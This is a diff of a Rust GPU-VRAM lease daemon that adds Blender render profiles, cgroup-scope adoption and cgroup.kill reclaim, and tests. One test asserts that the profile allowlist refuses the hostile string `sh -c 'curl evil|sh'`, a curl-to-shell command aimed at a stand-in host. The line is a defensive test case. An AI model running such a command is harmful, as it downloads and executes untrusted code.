@@ -31,6 +31,7 @@
 //! comes from the gateway holding inference responses, ADR-0006). A revoke *signal* for
 //! cooperative holders, and the Hermes plugin that calls this, are the remaining work.
 
+use std::fs::File;
 use std::process::Stdio;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
@@ -42,6 +43,9 @@ use tokio::sync::Mutex;
 
 use crate::coord::{admit, arbitrate, free_mib, Admission, CallerClass, Holder, LeaseDecision, Tier};
 use crate::feed::feed_dir;
+// ADR-0022 Phase 1: reclaim a flatpak-scoped Blender lane (cgroup.kill via a pinned dir-fd) — the
+// process-group SIGKILL can't reach a lane flatpak reparents into a systemd scope. See `scope_reclaim`.
+use crate::scope_reclaim::{self, ScopeHandle};
 // The keyhole consumes `keyhole.json` (read-only); the lease daemon publishes its arbitration
 // state to a sibling `lease.json` the keyhole producer merges in. Reusing the SAME type both
 // sides (de)serialize keeps the contract locked (ADR-0012 §3).
@@ -49,6 +53,22 @@ use crate::keyhole::Lease;
 
 /// Safety headroom kept free on a fresh grant (mirrors `coord` / ADR-0004 margins).
 const HEADROOM_MIB: u64 = 512;
+
+/// Conservative default footprint for the `eevee-render` profile (ADR-0023 P1). Distinct from the
+/// `blender-render` Cycles wrapper, whose caller-supplied ~8000-MiB estimate would always DENY
+/// against ComfyUI's ~5.8 GB residual headroom. EEVEE (rasteriser, no BVH/OptiX) is far lighter, so
+/// a render can actually be admitted beside a warm model. A `Spawn` caller may still override this
+/// with its own `estimate_mib`; this is the sane default the CLI hint advertises.
+/// TODO: replace with a measured NVML delta under a leashed EEVEE run (the same calibration the
+/// `// TODO: measured NVML delta` note on `blender-render` awaits).
+const EEVEE_RENDER_EST_MIB: u32 = 3000;
+
+/// After a scope reclaim (`cgroup.kill`), poll the pinned fd up to this many times for the lane to
+/// empty before re-reading free VRAM, so the just-granted successor doesn't allocate into not-yet-freed
+/// memory (review B2: `cgroup.kill` returns when the SIGKILL is *queued*, not when the driver freed the
+/// VRAM). Bounded × `SCOPE_RECLAIM_POLL_INTERVAL` so a hung lane can't stall the caller forever (fail-open).
+const SCOPE_RECLAIM_POLLS: u32 = 30;
+const SCOPE_RECLAIM_POLL_INTERVAL: Duration = Duration::from_millis(100);
 
 const BUS_NAME: &str = "org.agentos.Coordinator1";
 const OBJ_PATH: &str = "/org/agentos/Coordinator1";
@@ -62,6 +82,20 @@ const OBJ_PATH: &str = "/org/agentos/Coordinator1";
 const PROFILES: &[(&str, &[&str])] = &[
     // The dreaming/overnight ComfyUI the daemon owns + can SIGKILL (ADR-0009/0010 §5).
     ("comfyui", &["/home/corey/Documents/AgentOS/spikes/dreaming/start-comfyui.sh"]),
+    // A headless Blender Cycles render the daemon owns + can SIGKILL (ADR-0022 §3, Phase 0). The
+    // wrapper execs `blender -b … --python render.py` (a FIXED, repo-owned script — never an agent
+    // param) and caps Cycles' own VRAM so a heavy scene fails its frame, not the driver. The owned
+    // PID is blender → SIGKILL frees the CUDA context. `params` carry only validated scalars.
+    ("blender-render", &["/home/corey/Documents/AgentOS/integrations/blender/render-wrapper.sh"]),
+    // A headless EEVEE render the daemon owns + can SIGKILL (ADR-0023 P1). DISTINCT from
+    // `blender-render` purely so the daemon (and the operator) treat it as a LIGHT lane: EEVEE is a
+    // rasteriser (no BVH/OptiX), so a render can actually be ADMITTED beside a warm model, whereas the
+    // Cycles `blender-render`'s ~8000-MiB caller estimate would always DENY against ComfyUI's ~5.8 GB
+    // residual headroom. The daemon-owned program is the SAME hardened, path-validated wrapper (the safe
+    // entry point — engine selection is a render.py/wrapper concern, deferred per integrations/blender/
+    // README §6); the difference that matters at the lease layer is the conservative default footprint
+    // `EEVEE_RENDER_EST_MIB`, advertised in the CLI hint below.
+    ("eevee-render", &["/home/corey/Documents/AgentOS/integrations/blender/render-wrapper.sh"]),
     // A harmless stand-in for smoke-testing the lease plumbing (params e.g. ["600"]).
     ("sleep", &["/usr/bin/sleep"]),
 ];
@@ -207,12 +241,37 @@ impl Default for LeaseState {
 // Owned-child plumbing (the impure shell — kept out of the tested core).
 // ---------------------------------------------------------------------------
 
-/// A batch job agentosd spawned and owns, so it can SIGKILL it on preemption.
+/// How the lease reclaims the GPU from an owned holder. The lever differs by how the holder was
+/// launched, and that difference is the whole of ADR-0022 Phase 1:
+///   * `Spawned`  — agentosd spawned the job, so it owns the `Child` (reaping) + a process group it can
+///     negative-PID SIGKILL (`sigkill_group`). The existing ComfyUI/batch path.
+///   * `Scope`    — an externally-launched flatpak Blender **lane** that flatpak reparented into a
+///     systemd scope (so a group SIGKILL can't reach it). Reclaimed by SIGKILLing the whole cgroup
+///     scope (`cgroup.kill`) via a dir-fd pinned at adopt time. agentosd did NOT spawn it → there is no
+///     `Child`, and `Release` must NOT kill it (it's the user's authoring app; it exits on its own).
+enum Reclaim {
+    Spawned { child: Child, pid: u32 },
+    Scope { handle: ScopeHandle, dir: File, lane_pid: u32 },
+}
+
+/// A GPU job that owns the single lease and can be reclaimed on preemption — either an agentosd-spawned
+/// child or an adopted flatpak lane scope (the `reclaim` field carries which, ADR-0013 + ADR-0022).
 struct OwnedJob {
     token: u64,
-    child: Child,
-    pid: u32,
     label: String,
+    reclaim: Reclaim,
+}
+
+/// What the caller is asking the lease for — the cooperative/owned/adopted distinction, threaded into the
+/// shared `do_acquire` core so the admission + arbitration + GO-1 clamp are identical on every path.
+enum AcquireKind {
+    /// `Acquire` — the caller runs + owns its own GPU process (Hermes interactive inference).
+    Cooperative,
+    /// `Spawn` — agentosd spawns + owns a child from an allowlisted profile (ComfyUI/batch).
+    Spawn(Vec<String>),
+    /// `AdoptScope` — agentosd records a flatpak lane's already-running cgroup scope as the reclaim
+    /// handle (ADR-0022 Phase 1). `handle`/`dir` are resolved + pinned by the daemon, never caller input.
+    AdoptScope { handle: ScopeHandle, dir: File, lane_pid: u32 },
 }
 
 /// The daemon's shared mutable state: the lease decision + the at-most-one owned child
@@ -257,8 +316,17 @@ fn short_label(label: &str) -> String {
         .next()
         .map(|p| p.rsplit('/').next().unwrap_or(p).to_string())
         .unwrap_or_default();
+    // An adopted lane's label IS its scope unit (`app-flatpak-org.blender.Blender-NNNN.scope`); collapse
+    // it to a stable tray name rather than the noisy instance-id'd unit (ADR-0022 Phase 1).
+    if base.starts_with("app-flatpak-org.blender.Blender-") {
+        return "blender-lane".to_string();
+    }
     match base.as_str() {
         "start-comfyui.sh" => "comfyui".to_string(),
+        // Both `blender-render` (Cycles) and `eevee-render` (ADR-0023 P1) resolve to the same hardened
+        // wrapper, so the launcher basename alone can't tell them apart at the tray. They share a label;
+        // the lease-layer distinction is the footprint estimate, not the program. Honest, not faked.
+        "render-wrapper.sh" => "blender-render".to_string(),
         _ => base,
     }
 }
@@ -382,11 +450,11 @@ async fn release_token(
             return false; // GO-2: foreign-token release — refuse, identical to an unknown token
         }
         let freed = g.lease.release(token);
-        let mut to_reap: Option<(Child, u32)> = None;
+        let mut to_reap: Option<Reclaim> = None;
         if freed {
             if let Some(job) = g.owned.take() {
                 if job.token == token {
-                    to_reap = Some((job.child, job.pid));
+                    to_reap = Some(job.reclaim);
                 } else {
                     g.owned = Some(job);
                 }
@@ -403,11 +471,21 @@ async fn release_token(
     };
     if freed {
         write_lease_mirror(mirror, &snap);
-        if let Some((mut child, pid)) = to_reap {
-            sigkill_group(pid);
-            tokio::spawn(async move {
-                let _ = child.wait().await; // reap the leader (no zombie)
-            });
+        match to_reap {
+            // A spawned child: releasing means "done with the GPU" → SIGKILL the group + reap the leader.
+            Some(Reclaim::Spawned { mut child, pid }) => {
+                sigkill_group(pid);
+                tokio::spawn(async move {
+                    let _ = child.wait().await; // reap the leader (no zombie)
+                });
+            }
+            // An adopted lane: Release = stop coordinating it, NOT kill it. agentosd didn't spawn the
+            // user's Blender; the pinned dir-fd drops (closed) here and the lane runs on uncoordinated
+            // until it exits on its own (its natural-exit auto-release / TTL still apply). (ADR-0022)
+            Some(Reclaim::Scope { handle, .. }) => {
+                println!("coordd: released adopted lane `{}` — left running (not agentosd-owned)", handle.scope_unit);
+            }
+            None => {}
         }
     }
     freed
@@ -426,16 +504,16 @@ struct Coordinator {
 }
 
 impl Coordinator {
-    /// Shared path for both `Acquire` (cooperative, `argv = None`) and `Spawn`
-    /// (owned, `argv = Some`). The lock is held across the decision AND the
-    /// spawn/evict so the lease and the child it controls never disagree.
+    /// Shared path for `Acquire` (cooperative), `Spawn` (owned child) and `AdoptScope` (owned flatpak
+    /// lane scope). The lock is held across the decision AND the spawn/evict so the lease and the holder
+    /// it controls never disagree. The destructive reclaim itself runs OFF the lock (review C5).
     async fn do_acquire(
         &self,
         caller: Option<String>,
         class: CallerClass,
         tier_name: String,
         estimate_mib: u32,
-        argv: Option<Vec<String>>,
+        kind: AcquireKind,
     ) -> (bool, u64, String) {
         use std::fmt::Write as _;
 
@@ -454,7 +532,7 @@ impl Coordinator {
 
         // H3: pre-flight the binary BEFORE we lock/evict, so a bad argv can't destroy an
         // incumbent. (PATH-relative names pass through; resolved at spawn time.)
-        if let Some(args) = argv.as_deref() {
+        if let AcquireKind::Spawn(args) = &kind {
             if args.is_empty() {
                 return (false, 0, "spawn: empty argv".into());
             }
@@ -552,15 +630,14 @@ impl Coordinator {
             }
         };
 
-        // Evict the previously-owned child on preemption — carry the Child OUT so we can
-        // reap it (H2) rather than drop-and-hope; SIGKILL the whole group (R1).
-        let mut evicted_child: Option<Child> = None;
-        let mut evicted_info: Option<(u64, String, u32, &'static str)> = None;
+        // Evict the previously-owned holder on preemption — carry its reclaim handle OUT so we run the
+        // destructive reclaim OFF the lock (review C5). A Spawned victim is group-SIGKILLed + reaped
+        // (R1/H2); a Scope victim is cgroup.killed via its pinned fd then confirmed freed (ADR-0022 B2).
+        let mut evicted: Option<(String, Reclaim, &'static str)> = None;
         if let Some((victim, fit)) = preempted {
             if let Some(job) = inner.owned.take() {
                 if job.token == victim {
-                    evicted_info = Some((job.token, job.label.clone(), job.pid, fit));
-                    evicted_child = Some(job.child);
+                    evicted = Some((job.label, job.reclaim, fit));
                 } else {
                     inner.owned = Some(job); // not the victim (shouldn't happen) — keep it
                 }
@@ -569,8 +646,8 @@ impl Coordinator {
 
         // Narrate the contention for the keyhole's arbitration line (set under the lock,
         // published off it). A fresh, uncontended grant clears it → "no contention".
-        inner.last_preempt = match (preempted, &evicted_info) {
-            (Some((_, fit)), Some((_, label, _, _))) => {
+        inner.last_preempt = match (preempted, &evicted) {
+            (Some((_, fit)), Some((label, _, _))) => {
                 format!("{} preempted `{}` ({fit})", tier.as_str(), short_label(label))
             }
             (Some((victim, fit)), None) => {
@@ -579,52 +656,61 @@ impl Coordinator {
             _ => String::new(),
         };
 
-        // `Spawn` requests: agentosd spawns + OWNS the child. On spawn failure, roll the
-        // lease back (a lease without its process is worse than no lease) and reap any victim.
-        if let Some(args) = argv.as_deref() {
-            match spawn_owned(args) {
+        // Install the holder's reclaim handle (under the lock). Cooperative: nothing to own (the caller
+        // runs its own process). Spawn: agentosd spawns + OWNS a child — on spawn failure roll the lease
+        // back (a lease without its process is worse than no lease) and reclaim any victim. AdoptScope:
+        // record the flatpak lane's pinned cgroup scope as the reclaim handle (ADR-0022 Phase 1).
+        let mut owned_pid: Option<u32> = None;
+        let bind_peer = !matches!(kind, AcquireKind::Spawn(_));
+        let kind_note = match &kind {
+            AcquireKind::AdoptScope { handle, lane_pid, .. } => {
+                Some(format!("adopted lane `{}` (pid {lane_pid})", handle.scope_unit))
+            }
+            _ => None,
+        };
+        match kind {
+            AcquireKind::Cooperative => {}
+            AcquireKind::Spawn(args) => match spawn_owned(&args) {
                 Ok((child, pid)) => {
-                    inner.owned = Some(OwnedJob { token, child, pid, label: args.join(" ") });
+                    owned_pid = Some(pid);
+                    inner.owned =
+                        Some(OwnedJob { token, label: args.join(" "), reclaim: Reclaim::Spawned { child, pid } });
                 }
                 Err(e) => {
                     inner.lease.release(token);
                     drop(inner);
-                    if let Some((vt, label, pid, _)) = evicted_info {
-                        eprintln!("coordd: spawn failed after preempting token {vt} (`{label}` pid {pid})");
-                        sigkill_group(pid);
-                    }
-                    if let Some(mut ch) = evicted_child {
-                        let _ = ch.wait().await;
+                    if let Some((label, reclaim, _)) = evicted {
+                        eprintln!("coordd: spawn failed after preempting `{}` — reclaiming it", short_label(&label));
+                        self.perform_reclaim(label, reclaim, "n/a", free_opt.unwrap_or(0)).await;
                     }
                     // Lease rolled back → publish "no contention" (off-lock; inner is dropped).
                     write_lease_mirror(self.mirror.as_deref(), &Lease::default());
                     return (false, 0, format!("spawn failed: {e}"));
                 }
+            },
+            AcquireKind::AdoptScope { handle, dir, lane_pid } => {
+                let label = handle.scope_unit.clone();
+                inner.owned =
+                    Some(OwnedJob { token, label, reclaim: Reclaim::Scope { handle, dir, lane_pid } });
             }
         }
 
-        // Record the caller's bus name for peer-disconnect auto-release (B4) — but ONLY for a
-        // *cooperative* holder, whose own process IS the GPU user: if it crashes, free the lease
-        // so the lane can't wedge (finding H4). An *owned* (`Spawn`) job is decoupled from the
-        // caller's connection — the daemon owns the child, the caller may disconnect between
-        // `Spawn` and `Release` (e.g. `busctl`-per-call) — so its liveness is the child's, not
-        // the peer's (tracked by the supervisor / Release / preempt, with a TTL the remaining gap).
-        inner.holder_peer = if argv.is_none() { caller.map(|c| (token, c)) } else { None };
+        // Record the caller's bus name for peer-disconnect auto-release (B4) + GO-2 identity binding —
+        // for a *cooperative* holder (its own process IS the GPU user) AND for an *adopted lane* (so only
+        // the adopter may `Release` it, review B2 — the small monotonic token alone is guessable). A
+        // `Spawn` job stays unbound (`None`): the daemon owns the child and the `busctl`-per-call caller
+        // may disconnect between Spawn and Release. The supervisor SKIPS the B4 disconnect-release for any
+        // owned holder (Spawn or Scope), so a fire-and-forget launcher exiting can't drop a live lane.
+        inner.holder_peer = if bind_peer { caller.map(|c| (token, c)) } else { None };
         inner.holder_deadline = Some(Instant::now() + lease_ttl()); // B5: start the TTL clock
 
-        let owned_pid = inner.owned.as_ref().filter(|j| j.token == token).map(|j| j.pid);
         let mirror_snap = lease_snapshot(&inner);
         drop(inner);
 
-        if let Some((vt, label, pid, fit)) = evicted_info {
-            println!(
-                "coordd: PREEMPT token {vt} → SIGKILL group of `{label}` pid {pid} \
-                 (own-PID/group evict, ADR-0010 §5; successor {fit})"
-            );
-            sigkill_group(pid);
-            if let Some(child) = evicted_child {
-                self.spawn_reclaim_task(child, free_opt.unwrap_or(0));
-            }
+        // Reclaim the evicted victim OFF the lock (review C5): a Spawned victim → group SIGKILL + reap;
+        // a Scope victim → cgroup.kill via its pinned fd, then backpressure the grant until VRAM frees.
+        if let Some((label, reclaim, fit)) = evicted {
+            self.perform_reclaim(label, reclaim, fit, free_opt.unwrap_or(0)).await;
         }
 
         // Publish the new arbitration state to the keyhole mirror — OFF the lock (ADR-0012 §3).
@@ -642,6 +728,9 @@ impl Coordinator {
         }
         if let Some(pid) = owned_pid {
             let _ = write!(msg, "; agentosd owns pid {pid}");
+        }
+        if let Some(note) = kind_note {
+            let _ = write!(msg, "; {note}");
         }
         // H1: a granted-but-won't-fit preempt is loud — the successor must offload/shrink.
         if matches!(preempted, Some((_, "WONT-FIT"))) {
@@ -669,6 +758,71 @@ impl Coordinator {
             }
         });
     }
+
+    /// Reclaim an evicted owned holder's GPU — the destructive lever, run OFF the `Inner` lock (review
+    /// C5). The lever depends on how the holder was launched (ADR-0013 vs ADR-0022 Phase 1).
+    async fn perform_reclaim(&self, label: String, reclaim: Reclaim, fit: &str, before_free: u64) {
+        match reclaim {
+            Reclaim::Spawned { child, pid } => {
+                println!(
+                    "coordd: PREEMPT → SIGKILL group of `{}` pid {pid} \
+                     (own-PID/group evict, ADR-0010 §5; successor {fit})",
+                    short_label(&label)
+                );
+                sigkill_group(pid);
+                self.spawn_reclaim_task(child, before_free); // reap + prove reclaim off-path (H2)
+            }
+            Reclaim::Scope { handle, dir, lane_pid } => {
+                self.reclaim_scope(handle, dir, lane_pid, fit, before_free).await;
+            }
+        }
+    }
+
+    /// SIGKILL a flatpak lane by its cgroup scope (ADR-0022 Phase 1), then BACKPRESSURE the grant: hold
+    /// the successor's "granted" response until the lane's VRAM is actually freed (review B2 —
+    /// `cgroup.kill` returns when the SIGKILL is *queued*, not when the driver tore down the CUDA context).
+    /// Entirely off the lock; bounded so a hung lane can't stall the caller forever (fail-open, ADR-0003 —
+    /// the next admission's true-free NVML read governs). The pinned dir-fd (`dir`) makes the kill
+    /// recycle-proof (B3): if the scope was reaped/reused, `openat` fails and we treat it as already gone.
+    async fn reclaim_scope(&self, handle: ScopeHandle, dir: File, lane_pid: u32, fit: &str, before_free: u64) {
+        match scope_reclaim::kill_scope_at(&dir) {
+            Ok(true) => println!(
+                "coordd: PREEMPT → cgroup.kill `{}` (lane pid {lane_pid}, {}; successor {fit})",
+                handle.scope_unit,
+                handle.cgroup_kill_path().display()
+            ),
+            Ok(false) => {
+                println!("coordd: PREEMPT `{}` — scope already gone (lane exited; nothing to kill)", handle.scope_unit)
+            }
+            Err(e) => {
+                // Fail-open (ADR-0003): can't reclaim (e.g. an older kernel without cgroup.kill) → log,
+                // never panic; the lane runs on uncoordinated and the next admission avoids piling on.
+                eprintln!(
+                    "coordd: WARNING could not cgroup.kill `{}`: {e} — lane runs uncoordinated (fail-open)",
+                    handle.scope_unit
+                );
+                return;
+            }
+        }
+        // Confirm the lane actually emptied (pinned fd) before re-reading free, so the just-granted
+        // successor doesn't allocate into not-yet-freed VRAM (B2). Bounded — a hung lane is left to the TTL.
+        let mut emptied = false;
+        for _ in 0..SCOPE_RECLAIM_POLLS {
+            if scope_reclaim::scope_is_empty_at(&dir) {
+                emptied = true;
+                break;
+            }
+            tokio::time::sleep(SCOPE_RECLAIM_POLL_INTERVAL).await;
+        }
+        tokio::time::sleep(Duration::from_millis(150)).await; // brief driver settle
+        if let Some(after) = free_mib(&self.nvml).await {
+            println!(
+                "coordd: post-reclaim free {after}M (was {before_free}M; Δ {}M){}",
+                after.saturating_sub(before_free),
+                if emptied { " reclaimed" } else { " — WARNING lane scope not confirmed empty (fail-open)" }
+            );
+        }
+    }
 }
 
 #[zbus::interface(name = "org.agentos.Coordinator1")]
@@ -685,7 +839,7 @@ impl Coordinator {
         let caller = hdr.sender().map(|s| s.to_string());
         // The session-bus D-Bus verbs are the trusted Hermes/human/CLI path (ADR-0021): tier passes
         // through. The future agent-facing `act` verbs are the first `CallerClass::Agent` callers.
-        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, None).await
+        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, AcquireKind::Cooperative).await
     }
 
     /// Owned lease via a daemon-owned launch *profile* (ADR-0013 A2 — no caller-supplied
@@ -705,7 +859,56 @@ impl Coordinator {
         };
         argv.extend(params);
         let caller = hdr.sender().map(|s| s.to_string());
-        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, Some(argv)).await
+        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, AcquireKind::Spawn(argv)).await
+    }
+
+    /// Adopt an externally-launched flatpak Blender **lane** (ADR-0022 Phase 1): register its systemd
+    /// cgroup scope as the lease's reclaim handle so a higher tier can SIGKILL the lane (`cgroup.kill`)
+    /// when the desktop needs the GPU back — the lever a process-group SIGKILL can't reach (the lane is
+    /// reparented into a transient scope). `lane_pid` is the lane's listening PID; the daemon resolves the
+    /// scope ITSELF from `/proc/<pid>/cgroup` (never a caller-supplied path, review B1) and admits ONLY an
+    /// allowlisted `app-flatpak-org.blender.Blender-*.scope` — the editor/terminal/browser can never be
+    /// adopted. `(granted, token, msg)`; `token` is 0 when not granted. Fail-open: a non-lane PID or an
+    /// un-pinnable scope is refused, not fatal — the caller (`blender-mcp.sh`) then runs uncoordinated.
+    async fn adopt_scope(
+        &self,
+        #[zbus(header)] hdr: zbus::message::Header<'_>,
+        tier: String,
+        estimate_mib: u32,
+        lane_pid: u32,
+    ) -> (bool, u64, String) {
+        // A lane is a background GPU consumer — it must NEVER hold Interactive (the only non-preemptible
+        // tier; an Interactive lane could never be reclaimed, defeating the whole point of adopting it).
+        // Clamp the requested tier to ≤ Batch here (GO-1 style: clamp, don't error). do_acquire's
+        // `class.clamp` is a no-op for Trusted, so the ceiling has to be applied at this verb.
+        let tier = match Tier::from_arg(&tier) {
+            Ok(t) => t.clamp_to(Tier::Batch).as_str().to_string(),
+            Err(e) => return (false, 0, format!("adopt: {e}")),
+        };
+        // Resolve + allowlist the scope SERVER-SIDE from the PID (B1) — a non-lane PID can never arm a kill.
+        let Some(handle) = scope_reclaim::resolve_lane_scope(lane_pid) else {
+            return (false, 0, format!("adopt: pid {lane_pid} is not a flatpak Blender lane scope (refused)"));
+        };
+        // Pin the scope's cgroup dir as a dir-fd NOW (B3): a recycled scope name can't redirect the later
+        // kill. If we can't pin it, don't adopt — better the lane runs uncoordinated than hold a stale
+        // kill handle that could land on the wrong cgroup.
+        let dir = match scope_reclaim::open_scope_dir(&handle) {
+            Ok(d) => d,
+            Err(e) => return (false, 0, format!("adopt: cannot pin scope `{}`: {e}", handle.scope_unit)),
+        };
+        let caller = hdr.sender().map(|s| s.to_string());
+        // CallerClass::Trusted: `AdoptScope` is a DESTRUCTIVE verb, but for the trusted human-operated
+        // forge it is Trusted (ADR-0022 §4). The autonomous path (ADR-0020 `act` verbs) MUST NOT reach
+        // this verb until GO-2 identity + the §4 hardening land — for an untrusted caller an adopt would be
+        // a cross-principal kill primitive (security review C2). The GO-1 clamp in do_acquire binds then.
+        self.do_acquire(
+            caller,
+            CallerClass::Trusted,
+            tier,
+            estimate_mib,
+            AcquireKind::AdoptScope { handle, dir, lane_pid },
+        )
+        .await
     }
 
     /// Release the lease (true iff `token` is the current holder's). If that holder is an
@@ -767,13 +970,20 @@ async fn supervise(inner: Arc<Mutex<Inner>>, mirror: Option<PathBuf>, conn: zbus
         //    monotonic-token guard makes a late reap a safe no-op if the holder has changed.
         let (exited, snap) = {
             let mut g = inner.lock().await;
-            let done = match g.owned.as_mut() {
-                Some(job) => job
-                    .child
-                    .try_wait()
-                    .ok()
-                    .flatten()
-                    .map(|status| (job.token, job.label.clone(), status)),
+            // Natural-exit detection differs by reclaim kind: a spawned child is reaped via `try_wait`; an
+            // adopted lane is "exited" when its cgroup scope has emptied (read via the pinned fd — only a
+            // GONE scope counts as empty, review C2, so a transient read flap can't false-release a live
+            // lane). Done under the lock + by the job's own token, so a late detect is a safe no-op (C3).
+            let done: Option<(u64, String, String)> = match g.owned.as_mut() {
+                Some(job) => match &mut job.reclaim {
+                    Reclaim::Spawned { child, .. } => child
+                        .try_wait()
+                        .ok()
+                        .flatten()
+                        .map(|status| (job.token, job.label.clone(), format!("exited ({status})"))),
+                    Reclaim::Scope { dir, .. } => scope_reclaim::scope_is_empty_at(dir)
+                        .then(|| (job.token, job.label.clone(), "lane scope emptied".to_string())),
+                },
                 None => None,
             };
             if let Some((token, _, _)) = &done {
@@ -788,8 +998,8 @@ async fn supervise(inner: Arc<Mutex<Inner>>, mirror: Option<PathBuf>, conn: zbus
             }
             (done, lease_snapshot(&g))
         };
-        if let Some((token, label, status)) = exited {
-            println!("coordd: owned job `{label}` (token {token}) exited ({status}) → lease released");
+        if let Some((token, label, reason)) = exited {
+            println!("coordd: owned job `{}` (token {token}) {reason} → lease released", short_label(&label));
             // Publish off-lock (the guard is already dropped) so the keyhole reflects the release.
             write_lease_mirror(mirror.as_deref(), &snap);
         }
@@ -798,15 +1008,24 @@ async fn supervise(inner: Arc<Mutex<Inner>>, mirror: Option<PathBuf>, conn: zbus
         //    vanished (crashed without `Release`), free the lease so a dead holder can't wedge
         //    the lane forever (finding H4). Poll-based — reuses this loop, no signal stream.
         if let Some(dbus) = &dbus {
-            let peer = { inner.lock().await.holder_peer.clone() };
+            let (peer, owned_token) = {
+                let g = inner.lock().await;
+                (g.holder_peer.clone(), g.owned.as_ref().map(|j| j.token))
+            };
             if let Some((token, name)) = peer {
-                let alive = match zbus::names::BusName::try_from(name.as_str()) {
-                    Ok(bn) => dbus.name_has_owner(bn).await.unwrap_or(true), // on error assume alive
-                    Err(_) => true,
-                };
-                if !alive {
-                    println!("coordd: holder peer {name} gone → auto-release token {token} (ADR-0013 B4)");
-                    release_token(&inner, mirror.as_deref(), token, None).await; // authoritative (B4)
+                // B4 governs a COOPERATIVE holder (its own process IS the GPU user). An owned holder — a
+                // Spawn child OR an adopted lane (review B2 binds its peer for GO-2 Release authz) — has its
+                // own liveness signal (child exit / scope empty), so a fire-and-forget launcher (e.g.
+                // `blender-mcp.sh`) disconnecting must NOT drop a live lane. Skip B4 for an owned token.
+                if owned_token != Some(token) {
+                    let alive = match zbus::names::BusName::try_from(name.as_str()) {
+                        Ok(bn) => dbus.name_has_owner(bn).await.unwrap_or(true), // on error assume alive
+                        Err(_) => true,
+                    };
+                    if !alive {
+                        println!("coordd: holder peer {name} gone → auto-release token {token} (ADR-0013 B4)");
+                        release_token(&inner, mirror.as_deref(), token, None).await; // authoritative (B4)
+                    }
                 }
             }
         }
@@ -845,9 +1064,18 @@ async fn serve() -> Result<(), Box<dyn std::error::Error>> {
     // Supervisor needs the connection for B4 peer-liveness checks; keep `conn` alive until exit.
     tokio::spawn(supervise(Arc::clone(&inner), mirror, conn.clone()));
 
+    // ADR-0023 P1 (home A): mount the `org.agentos.Wind1` window-drag→wind sink on THIS connection +
+    // spawn its fixed-tick spring task. It owns ONLY its own state (no path to `Inner`) so the 60 Hz
+    // tick can never delay a preemption SIGKILL (Design 0023 §3.1). Fail-open: a mount failure is
+    // logged, never fatal — the coordinator keeps serving regardless.
+    let wind_dir = feed_dir().ok();
+    crate::wind::attach(&conn, wind_dir).await;
+
     println!("agentosd coordd — VRAM coordinator daemon serving {BUS_NAME} (ADR-0006/0010)");
     println!("  spawn (owned) : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Spawn susas batch 2000 sleep 1 600");
+    println!("  eevee (owned) : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Spawn susas batch {EEVEE_RENDER_EST_MIB} eevee-render 2 --out /run/user/$UID/agentos/blender  (ADR-0023; light lane)");
     println!("  acquire (coop): busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Acquire su interactive 5000");
+    println!("  adopt (lane)  : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} AdoptScope suu batch 3000 <lane_pid>  (ADR-0022)");
     println!("  status        : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Status");
     println!("  release       : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Release t <token>");
     tokio::signal::ctrl_c().await?;
@@ -877,6 +1105,15 @@ mod tests {
             short_label("/home/corey/Documents/AgentOS/spikes/dreaming/start-comfyui.sh"),
             "comfyui"
         );
+        // The Blender render profile (ADR-0022) maps the same way → tray reads "batch (blender-render)".
+        assert_eq!(
+            short_label("/home/corey/Documents/AgentOS/integrations/blender/render-wrapper.sh"),
+            "blender-render"
+        );
+        // An adopted lane's label IS its scope unit → collapses to a stable tray name (ADR-0022 Phase 1),
+        // never the noisy per-instance id.
+        assert_eq!(short_label("app-flatpak-org.blender.Blender-3630677696.scope"), "blender-lane");
+        assert_eq!(short_label("app-flatpak-org.blender.Blender-1.scope"), "blender-lane");
     }
 
     #[test]
@@ -949,6 +1186,21 @@ mod tests {
         // A token that isn't the bound one falls through to the token guard (release() then fails it),
         // so a foreign release reads as "unknown token" — identical failure, no state change.
         assert!(may_release(Some(&bound), 999, Some(":1.99")));
+    }
+
+    #[test]
+    fn adopt_scope_clamps_a_lane_to_at_most_batch() {
+        // The invariant `adopt_scope` enforces (ADR-0022 + review): a lane must never be Interactive — the
+        // only non-preemptible tier — or it could never be reclaimed. Interactive clamps to Batch; lower
+        // tiers pass through. (do_acquire's Trusted clamp is identity, so this ceiling lives at the verb.)
+        assert_eq!(Tier::from_arg("interactive").unwrap().clamp_to(Tier::Batch), Tier::Batch);
+        assert_eq!(Tier::from_arg("batch").unwrap().clamp_to(Tier::Batch), Tier::Batch);
+        assert_eq!(Tier::from_arg("best-effort").unwrap().clamp_to(Tier::Batch), Tier::BestEffort);
+        // End-to-end: a lane clamped to Batch QUEUES behind a live Interactive holder (never preempts it).
+        let mut st = LeaseState::new();
+        st.acquire(Tier::Interactive, &fits()); // a live human/interactive holder
+        let lane_tier = Tier::from_arg("interactive").unwrap().clamp_to(Tier::Batch); // == Batch
+        assert_eq!(st.acquire(lane_tier, &fits()), AcquireResult::Queued);
     }
 
     #[test]
@@ -1033,11 +1285,35 @@ mod tests {
         // Known profiles resolve to an absolute, daemon-owned command (no caller binary).
         let comfy = resolve_profile("comfyui").unwrap();
         assert!(comfy[0].starts_with('/') && comfy[0].ends_with("start-comfyui.sh"));
+        let blender = resolve_profile("blender-render").unwrap();
+        assert!(blender[0].starts_with('/') && blender[0].ends_with("render-wrapper.sh"));
+        // ADR-0023 P1: the EEVEE lane is its OWN allowlisted profile (distinct name), resolving to the
+        // same hardened wrapper as the Cycles lane — the lease-layer distinction is the footprint.
+        let eevee = resolve_profile("eevee-render").unwrap();
+        assert!(eevee[0].starts_with('/') && eevee[0].ends_with("render-wrapper.sh"));
         assert_eq!(resolve_profile("sleep").unwrap(), vec!["/usr/bin/sleep".to_string()]);
         // Anything else — including an attempted binary path — is refused (closes S1 RCE).
         assert!(resolve_profile("/bin/sh").is_none());
         assert!(resolve_profile("sh -c 'curl evil|sh'").is_none());
         assert!(resolve_profile("").is_none());
+    }
+
+    #[test]
+    fn eevee_render_is_admittable_where_cycles_would_deny() {
+        // The reason `eevee-render` exists (ADR-0023 P1): against ComfyUI's ~5.8 GB residual headroom,
